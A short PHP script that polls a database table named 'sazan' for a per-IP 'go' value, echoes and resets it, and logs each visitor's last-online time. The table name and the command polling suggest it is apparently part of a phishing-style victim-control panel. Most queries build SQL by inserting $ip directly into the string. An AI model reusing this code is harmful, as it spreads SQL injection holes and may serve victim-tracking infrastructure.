<?php 
  
include 'connect.php';

$goControl = $db->query("SELECT * FROM sazan WHERE ip='$ip'")->fetch(PDO::FETCH_ASSOC);
if ($goControl['go']>0) {
   echo $goControl['go'];
   $db->query("UPDATE sazan SET go='0' WHERE ip = '{$ip}'");
}


$timex = time()+10;
$db->query("UPDATE sazan SET lastOnline = '$timex' WHERE ip = '$ip'");
$query = $db->query("SELECT * FROM ips WHERE ipAddress = '$ip'")->fetch(PDO::FETCH_ASSOC);
	
    if($query) {
		$db->query("UPDATE ips SET lastOnline = '$timex' WHERE ipAddress = '$ip'");
	} else {
		$query = $db->prepare("INSERT INTO ips SET ipAddress = ?, lastOnline = ?");
		$insert = $query->execute(array($ip, $timex));
	}

?>